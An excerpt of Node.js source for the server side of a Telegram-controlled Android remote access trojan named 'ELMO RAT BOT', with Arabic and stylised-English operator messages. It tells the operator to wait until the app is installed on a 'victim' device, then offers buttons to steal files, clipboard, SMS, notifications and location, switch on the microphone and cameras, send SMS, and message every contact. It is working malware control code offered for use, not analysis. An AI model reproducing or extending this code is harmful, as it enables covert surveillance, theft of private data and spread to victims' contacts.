...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم تحميل السيرفر يقلب المفتري😈</h1>')
})
...
appBot.on('message', (message) => {
        ...
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["تحقق من الاجهزه المتصله😈"], ["تنفيذ الاوامر يقلب المفتري😈🔪"]],
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• 😈مرحباً بكم فيELMO RAT BOT😈\n\n' +
                '• اذا تم تثبيت التطبيق علي الجهاز المستهدف، فأنتظر حتى يتم اختراق الضحيه\n\n' +
                '• عندما تتلقي اشعار بأختراق الضحيه، هذا يعني ان الضحيه متصل و جاهز للاختراق😈🔪\n\n' +
                '• انقر على زر الامر و حدد الجهاز المطلوب للاختراق ثم حدد الامر المطلوب من بين الاوامر😈\n\n' +
                '• اذا واجهتك اي مشكله في تنفيذ الاوامر في البوت كل ما عليك هو ارسال كلمه /start للبدأ ❤‍🔥قناتي❤‍🔥\n\n' +
        ...
        if (message.text == 'تحقق من الاجهزه المتصله😈') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°•لا توجد اجهزه متصله للاختراق🤬\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                let text = '°• اختار جهاز لتنفيذ الامر عليه😈🔪 :\n\n'
        ...
        if (message.text == 'تنفيذ الاوامر يقلب المفتري😈🔪') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°•لا توجد اجهزه متصله للاختراق🤬\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                ...
                appBot.sendMessage(id, '°• اختار جهاز لتنفيذ الامر عليه😈🔪', {
                    "reply_markup": {
    ...
    if (commend == 'device') {
        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            ...
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'تطبيقات الضحيه📲', callback_data: `apps:${uuid}`},
                        {text: 'معلومات الجهاز📲😈', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'تحميل ملف📥😈', callback_data: `file:${uuid}`},
                        {text: 'مسح ملف🗑️', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'الحافظه🤓🔪', callback_data: `clipboard:${uuid}`},
                        {text: 'تشغيل الميكروفون🎙️😈', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'صوره خلفيه📸🙂', callback_data: `camera_main:${uuid}`},
                        {text: 'صوره اماميه📷😁', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'الموقع🥰🔪', callback_data: `location:${uuid}`},
                        {text: 'ارسال توست😈📩', callback_data: `toast:${uuid}`}
                    ],
                    [
                    ...
                    [
                        ...
                        {text: 'عرض الاشعارات💬😈', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'الرسائل✉️😈', callback_data: `messages:${uuid}`},
                        {text: 'ارسال رساله📤😈', callback_data: `send_message:${uuid}`}
                    ],
                    [
                    ...
                    [
                        {
                            text: 'ارسال رسائل الي جميع جهات الاتصال😈🔪',
